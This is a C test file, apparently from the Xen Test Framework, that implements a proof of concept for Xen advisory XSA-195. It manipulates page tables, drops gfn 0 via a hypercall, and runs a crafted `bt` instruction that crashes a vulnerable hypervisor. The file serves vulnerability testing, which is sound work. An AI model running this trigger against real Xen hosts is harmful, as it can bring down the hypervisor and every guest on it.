/**
 * @file tests/xsa-195/main.c
 * @ref test-xsa-195
 *
 * @page test-xsa-195 XSA-195
 *
 * Advisory: [XSA-195](https://xenbits.xen.org/xsa/advisory-195.html)
 *
 * The `bt` family of instructions can reference an arbitrary bit offset from
 * their memory operand.  The x86 instruction emulator accounts for this by
 * mutually modifying the both the bit index and the memory operand to make an
 * equivalent instruction, but with the bit index strictly in the range 0 to
 * op_bytes * 8.
 *
 * Before XSA-195, there was a bug with the handling of negative bit indices
 * when contained in 64bit registers.  Xen mis-adjusted both the memory
 * operand and the bit offset.
 *
 * If vulnerable, this test will cause Xen to because of accessing a
 * non-canonical address.  If Xen isn't vulnerable, the instruction will be
 * emulated correctly with no problems.
 *
 * @see tests/xsa-195/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-195 PoC";

static intpte_t nl3t[L3_PT_ENTRIES] __page_aligned_bss;
static intpte_t nl2t[L2_PT_ENTRIES] __page_aligned_bss;
static intpte_t nl1t[L1_PT_ENTRIES] __page_aligned_bss;

void test_main(void)
{
    unsigned int i;
    unsigned long *mem = _p((1ul << 47) - sizeof(unsigned long));
    unsigned long idx = 0xfffd000000000000ull;

    unsigned long mem_adjust = (8 + ((-idx - 1) >> 3)) & ~7;

    /*
     * linear is the memory target which the `bt` instruction will actually hit.
     * A vulnerable Xen mis-calculates the memory adjustment, meaning that it
     * will attempt to read from some other address.
     */
    unsigned long linear = _u(mem) - mem_adjust;

    /*
     * Make all of the virtual address space readable, so Xen's data fetch
     * succeeds.
     */
    l1_identmap[0] = pte_from_gfn(0, PF_SYM(AD, P));

    for ( i = 4; i < L3_PT_ENTRIES; ++i )
        pae_l3_identmap[i] = pae_l3_identmap[0] & ~PF_SYM(RW);

    for ( i = 1; i < L4_PT_ENTRIES; ++i )
        pae_l4_identmap[i] = pae_l4_identmap[0] & ~PF_SYM(RW);

    /* Map linear to pointing specifically to gfn 0. */
    nl1t[l1_table_offset(linear)] = pte_from_gfn(0, PF_SYM(U, P));
    nl2t[l2_table_offset(linear)] = pte_from_virt(nl1t, PF_SYM(U, P));
    nl3t[l3_table_offset(linear)] = pte_from_virt(nl2t, PF_SYM(U, P));
    pae_l4_identmap[l4_table_offset(linear)] = pte_from_virt(nl3t, PF_SYM(U, P));

    /* Remove gfn 0 from the p2m, to cause `bt` to trap for emulation. */
    static unsigned long extent = 0;
    static struct xen_memory_reservation mr =
        {
            .extent_start = &extent,
            .nr_extents = 1,
            .domid = DOMID_SELF,
        };
    if ( hypercall_memory_op(XENMEM_decrease_reservation, &mr) != 1 )
        return xtf_failure("Failed to decrease reservation at %#lx\n", extent);

    /* Poke the emulator. */
    asm volatile ("bt %[idx], %[mem];"
                  :: [mem] "m" (*mem),
                     [idx] "r" (idx));

    /* If we are still alive at this point, Xen didn't die. */

    xtf_success("Success: Not vulnerable to XSA-195\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
